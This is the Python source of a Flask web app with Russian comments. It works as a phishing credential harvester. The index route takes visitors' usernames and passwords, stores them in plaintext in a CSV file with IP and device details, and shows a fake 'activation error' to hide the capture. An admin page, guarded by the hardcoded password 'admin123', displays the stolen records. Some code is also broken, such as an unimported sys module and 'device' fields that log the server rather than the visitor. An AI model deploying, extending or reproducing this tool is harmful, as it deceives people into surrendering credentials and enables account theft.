from flask import Flask, request, render_template, redirect, session, flash, url_for
import csv
import os
import platform
import socket
import requests
from datetime import datetime
import uuid
import re
import subprocess
import psutil
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True

# Конфигурация
CSV_FILE = "visitors.csv"
os.makedirs('data', exist_ok=True)
CSV_PATH = os.path.join('data', CSV_FILE)
ADMIN_PASSWORD_HASH = generate_password_hash("admin123")

# Заголовки CSV
CSV_HEADERS = [
    'id', 'timestamp', 'username', 'password', 
    'public_ip', 'local_ip', 'browser',
    'device', 'os', 'cpu', 'ram', 'user_agent'
]

def init_csv():
    if not os.path.exists(CSV_PATH):
        with open(CSV_PATH, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=CSV_HEADERS)
            writer.writeheader()

init_csv()

def get_public_ip():
    """Получение публичного IP через надежные API"""
    services = [
        'https://api.ipify.org',
        'https://ident.me',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/ip'
    ]
    
    for service in services:
        try:
            response = requests.get(service, timeout=3)
            if response.status_code == 200:
                ip = response.text.strip()
                if ip and re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
                    return ip
        except:
            continue
    return 'unknown'

def get_local_ip():
    """Автоматическое определение локального IP"""
    try:
        # Универсальный способ для Linux/Windows/Mac
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return 'unknown'

def get_system_info():
    """Сбор детальной информации о системе"""
    try:
        cpu_info = f"{psutil.cpu_percent()}% ({psutil.cpu_count()} cores)"
        ram_info = f"{round(psutil.virtual_memory().total / (1024**3), 1)}GB"
        
        return {
            'os': platform.system(),
            'device': platform.node(),
            'cpu': cpu_info,
            'ram': ram_info,
            'browser': request.user_agent.browser,
            'user_agent': str(request.user_agent)
        }
    except Exception as e:
        print(f"Error getting system info: {e}")
        return {
            'os': platform.system(),
            'device': 'unknown',
            'cpu': 'unknown',
            'ram': 'unknown',
            'browser': 'unknown',
            'user_agent': 'unknown'
        }

def log_visitor(username='', password=''):
    """Гарантированная запись данных в CSV"""
    try:
        # 1. Подготовка данных
        visitor_data = {
            'id': str(uuid.uuid4()),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'username': username,
            'password': password,
            'public_ip': get_public_ip() or 'unknown',
            'local_ip': get_local_ip() or 'unknown',
            'browser': getattr(request.user_agent, 'browser', 'unknown'),
            'device': platform.node() or 'unknown',
            'os': platform.system() or 'unknown',
            'cpu': f"{psutil.cpu_percent()}%" if hasattr(psutil, 'cpu_percent') else 'unknown',
            'ram': f"{psutil.virtual_memory().total / (1024**3):.1f}GB" if hasattr(psutil, 'virtual_memory') else 'unknown',
            'user_agent': str(getattr(request, 'user_agent', 'unknown'))
        }

        # 2. Гарантированное создание директории
        os.makedirs(os.path.dirname(CSV_PATH), exist_ok=True)

        # 3. Атомарная запись в файл
        file_exists = os.path.isfile(CSV_PATH)
        with open(CSV_PATH, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=CSV_HEADERS)
            if not file_exists or f.tell() == 0:
                writer.writeheader()
            writer.writerow(visitor_data)
            f.flush()
            os.fsync(f.fileno())

        print(f"Успешно записано: {visitor_data}")  # Подтверждение записи
        return True
    except Exception as e:
        print(f"Критическая ошибка записи: {e}", file=sys.stderr)
        return False

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        
        if username and password:
            log_visitor(username, password)
            flash('Произошла ошибка активации. Попробуйте позже.', 'error')
            return render_template('index.html', show_error=True)
        else:
            flash('Пожалуйста, заполните все поля', 'error')
    
    if 'visited' not in session:
        log_visitor()
        session['visited'] = True
    
    return render_template('index.html', show_error=False)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin_logged_in'):
        return redirect(url_for('admin'))
    
    if request.method == 'POST':
        password = request.form.get('password')
        if check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['admin_logged_in'] = True
            return redirect(url_for('admin'))
        else:
            flash('Неверный пароль', 'error')
    
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

# В app.py обновляем функцию admin()
@app.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    # Чтение и обработка данных с гарантией всех полей
    data = []
    try:
        with open(CSV_PATH, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                # Создаем новый словарь с гарантией всех полей
                visitor = {key: row.get(key, '') for key in CSV_HEADERS}
                data.append(visitor)
    except Exception as e:
        flash(f'Ошибка чтения данных: {e}', 'error')
    
    return render_template('admin.html', visitors=data)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)